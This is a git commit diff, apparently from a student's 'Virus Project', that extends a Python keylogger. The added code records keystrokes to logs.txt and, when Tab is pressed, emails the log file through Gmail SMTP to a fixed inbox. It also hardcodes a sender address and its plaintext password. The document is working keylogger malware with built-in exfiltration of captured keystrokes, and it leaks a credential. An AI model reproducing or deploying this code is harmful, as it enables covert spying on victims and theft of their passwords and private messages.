64b90a69e5f42e126f4771a29d1c5386bcdfa2b7
Nick Hertzog <nickh671671@gmail.com>
2020-04-28 01:15:17 -0400

    ye ye

--- Virus Project/Key Logger/logger.py
+++ Virus Project/Key Logger/logger.py
@@ -1,8 +1,18 @@
-import pynput
-import os
+import pynput, os, email, ssl, smtplib, atexit
 from pynput.keyboard import Key, Listener
+from email import encoders
+from email.mime.base import MIMEBase
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 
 presses = []
+EmailAddress = "keylogs583@gmail.com"
+EmailPassword = "*r650A1#X@VW"
+
+message = MIMEMultipart()
+message["From"] = EmailAddress
+message["To"] = "nh6950@desales.edu"
+message["Subject"] = "Key Logs"
 
 def log_key(key):
     with open("logs.txt", "a") as f:
@@ -15,14 +25,29 @@ def log_key(key):
 def on_press(key):
     if key == Key.space or key == Key.enter:
         log_key(key)
+    elif key == Key.tab:
+        sendEmail()
     else:
         presses.append(key)
 
 def on_release(key):
     if key == Key.esc:
         return False
-        
+
+def sendEmail():
+    filename = "logs.txt"
+    with open(filename, "rb") as attachment:
+        part = MIMEBase("application", "octet-stream")
+        part.set_payload(attachment.read())
+    encoders.encode_base64(part)
+    message.attach(part)
+    text = message.as_string()
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server.starttls()
+    server.login(EmailAddress, EmailPassword)
+    server.sendmail(EmailAddress, "nh6950@desales.edu", text)
+    server.quit()
+
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 
-    
